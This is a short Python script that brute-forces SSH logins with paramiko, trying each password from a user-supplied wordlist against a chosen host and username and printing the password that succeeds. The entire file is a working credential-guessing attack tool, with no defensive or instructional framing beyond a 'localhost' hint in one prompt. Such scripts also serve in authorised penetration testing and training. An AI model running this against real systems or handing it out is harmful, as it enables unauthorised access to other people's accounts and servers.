import paramiko
import sys

host = input("Enter SSH host (localhost): ")
username = input("Enter username: ")
wordlist = input("Enter wordlist file path: ")

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    with open(wordlist, 'r') as f:
        passwords = f.readlines()
    
    for password in passwords:
        password = password.strip()
        try:
            ssh.connect(host, username=username, password=password, timeout=2)
            print(f"Success! Password is: {password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except Exception as e:
            print(f"Connection error: {e}")
            break

except FileNotFoundError:
    print("Wordlist file not found")